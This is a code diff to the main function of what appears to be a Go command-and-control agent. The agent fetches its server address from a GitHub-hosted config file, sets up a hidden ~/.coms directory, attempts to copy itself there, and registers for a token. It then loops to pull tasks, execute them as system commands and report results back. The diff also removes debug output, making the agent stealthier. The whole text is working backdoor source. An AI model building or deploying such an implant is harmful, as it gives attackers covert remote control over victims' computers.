@@ -17,13 +17,18 @@ import (
 )
 
 func main() {
-	myUrl := "http://10.10.174.35"
+	ConfigUrl := "https://raw.githubusercontent.com/Altrul/config/master/ip_coms"
+
 	proxy := false
 	OS := runtime.GOOS
 	client := &http.Client{}
 	home := os.Getenv("HOME") + "/"
 
 	err := os.Mkdir(home + ".coms", 0750)
+
+	executable, _ := os.Executable()
+
+	exec.Command("cp", executable, home + ".coms")
 
 	if(proxy) {
 		proxyPath := ""
@@ -43,11 +48,15 @@ func main() {
 
 		client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
 	}
-	//fmt.Println(inter.GetHttp(myUrl, client))
+
+	ServerIp := inter.GetHttp(ConfigUrl, client)
+	ServerIp = ServerIp[:len(ServerIp) - 1]
+
+	//fmt.Println(inter.GetHttp(ServerIp, client))
 
     token, err := ioutil.ReadFile(home +".coms/token")
     if err != nil || string(token) == "" {
-		token = []byte(auth.Register(myUrl, client))
+		token = []byte(auth.Register(ServerIp, client))
 		f, err := os.Create(home + ".coms/token")
 		if err != nil {
 			fmt.Println(err)
@@ -61,37 +70,39 @@ func main() {
 
 	connect_responce := inter.Response{}
 
-	connect_result := inter.PutHttpToken(myUrl + "/api/connect", client, token)
+	token_data := inter.Token {
+		Token: string(token),
+	}
+
+	token_json, _ := json.Marshal(token_data)
+
+	connect_result := inter.PutHttp(ServerIp + "/api/connect", client, token_json)
 
 	json.Unmarshal([]byte(connect_result), &connect_responce)
-	fmt.Println(connect_responce.Error)
 
 	if connect_responce.Error != "" {
-		token = []byte(auth.Register(myUrl, client))
+		token = []byte(auth.Register(ServerIp, client))
 		f, err := os.OpenFile(home + ".coms/token", os.O_RDWR|os.O_TRUNC, 0750)
 		if err != nil {
 			fmt.Println(err)
 		}
 		defer f.Close()
 		_, err = f.Write(token)
-		if err != nil {
-			fmt.Println(err)
-		}
 	}
 
-	fmt.Println(string(token))
 	for true {
-		tasks := tasking.GetTask(myUrl, client, token).Tasks
+		tasks := tasking.GetTask(ServerIp, client, token).Tasks
 		for _, task := range tasks {
-			fmt.Println(task)
 			command := strings.Fields(task.Args)[0]
 			args := strings.Fields(task.Args)[1:]
 			cmd := exec.Command(command, args...)
 			_, err := cmd.Output()
 			if err != nil {
-				fmt.Println(err)
+				tasking.SendReport(ServerIp, client, token, err.Error(), task.Id)
+			} else {
+				tasking.SendReport(ServerIp, client, token, "Script executed successfully", task.Id)
 			}
 		}
-		time.Sleep(3 * time.Second)
+		time.Sleep(time.Second / 2)
 	}
 }
